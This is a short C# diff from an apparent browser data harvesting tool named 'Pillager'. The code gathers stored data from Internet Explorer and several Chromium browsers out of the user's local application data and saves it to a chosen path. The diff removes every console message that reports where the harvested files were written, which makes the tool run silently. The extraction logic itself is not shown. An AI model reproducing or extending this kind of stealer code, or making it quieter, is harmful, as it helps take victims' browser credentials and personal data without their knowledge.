@@ -13,7 +13,6 @@ namespace Pillager
 
             //IE
             IE.Save(savepath);
-            Console.WriteLine("Files wrote to " + savepath + IE.BrowserName + "\\");
 
             //Chrome
             List<List<string>> browserOnChromium = new List<List<string>>()
@@ -33,8 +32,7 @@ namespace Pillager
                 string chromepath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                 browser[1]);
                 Chrome chrome = new Chrome(browser[0], chromepath);
-                chrome.Save(savepath);
-                Console.WriteLine("Files wrote to " + savepath + chrome.BrowserName + "\\");
+                chrome.Save(savepath);                
             }
         }
     }
